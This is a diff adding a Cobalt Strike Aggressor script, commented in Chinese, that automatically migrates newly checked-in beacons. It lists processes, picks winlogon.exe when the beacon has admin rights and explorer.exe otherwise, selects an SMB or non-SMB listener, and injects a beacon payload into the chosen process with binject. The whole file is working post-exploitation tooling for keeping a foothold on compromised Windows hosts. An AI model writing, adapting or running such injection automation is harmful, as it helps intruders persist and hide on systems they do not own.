@@ -1,0 +1,56 @@
+# 自动迁移进程
+sub callback{
+    # 目标架构
+    if (-is64 $1){
+        $arch = "x64";
+    } else{
+        $arch = "x86";
+    }
+    println("架构为:" . $arch);
+	$pid = beacon_info($1, "pid");
+	println("当前进程为: $pid");
+	# 查看是否是管理员来决定迁移到哪个进程
+	println($1);
+    if (-isadmin $1) {
+		println("属于管理员进程");
+        $regex = '(.*\n)+winlogon.exe\t\d+\t(\d+)(.*\n)+';
+	} else{
+		println("不属于管理员进程");
+        $regex = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';
+    }
+
+    local('$listener');
+    local('$current_listener');
+    if (beacon_info($1, "pbid") eq "") {  # Not SMB
+        foreach $listener (listeners_local()) {
+            if (listener_info($listener, "payload") ne "windows/beacon_smb/bind_pipe") {
+                #println($listener);
+                $current_listener = $listener;
+            }
+        }
+    } else {
+        foreach $listener (listeners_local()) {
+            if (listener_info($listener, "payload") eq "windows/beacon_smb/bind_pipe") {
+                #println($listener);
+                $current_listener = $listener;
+            }
+        }
+    }
+	println("选用的listen： $current_listener"); 
+	if ($2 ismatch $regex){
+        $explorer_id = matched()[1];
+		println("目标进程号：$explorer_id");
+		# 如果当前进程不属于上述进程，再进行迁徙，否则会造成循环
+        if($pid != $explorer_id){
+            println("执行进程迁徙！！！！！！！");
+            binject($1, $explorer_id, $current_listener, $arch);
+        }else{
+			println("不执行进程迁徙");
+		}
+    }
+}
+
+on beacon_initial{
+	bps($1, &callback);
+}
+
